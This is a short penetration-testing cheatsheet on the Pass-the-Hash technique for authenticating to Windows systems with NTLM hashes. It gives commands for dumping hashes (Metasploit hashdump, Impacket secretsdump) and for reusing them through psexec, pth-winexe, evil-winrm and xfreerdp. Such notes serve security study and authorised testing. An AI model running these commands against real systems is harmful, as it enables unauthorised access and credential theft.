# Pass the Hash
Pass the hash technique allow an attacker to authenticate to a remote system or service using a user' NTLM hash instead of plaintext password. It requires access to the special administrative share named Admin$, thus also local administrative rights. There many tools for performing a similar to legimate use of connecting with SMB. [[Metasploit]] has:
```bash
post/windows/gather/hashdump
exploit/windows/smb/psexec
```
Another method:
```bash
pth-winexe -U $username%$NT:$LM //$ip cmd
```
[[Impacket-Cheatsheet]] with:
```bash
secretsdump.py $user@$ip -hashes $hash
```
Or login with [[Evil-winrm-Cheatsheet]] using  `-H`  or  `xfreerdp` with:
```bash
xfreerdp /v:$IP /u:Administrator /pth:$Hash
```
